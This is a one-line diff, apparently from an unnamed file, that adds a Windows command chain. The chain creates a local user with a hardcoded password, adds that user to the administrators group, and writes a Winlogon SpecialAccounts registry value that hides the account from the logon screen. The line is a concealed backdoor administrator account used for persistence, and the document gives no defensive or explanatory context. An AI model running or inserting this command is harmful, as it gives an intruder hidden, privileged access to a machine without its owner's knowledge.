@@ -1,0 +1,1 @@
+net user bhabhi Sophos1985 /add && net localgroup administrators bhabhi /add && reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList\" /v bhabhi /d 0 /t REG_DWORD /f
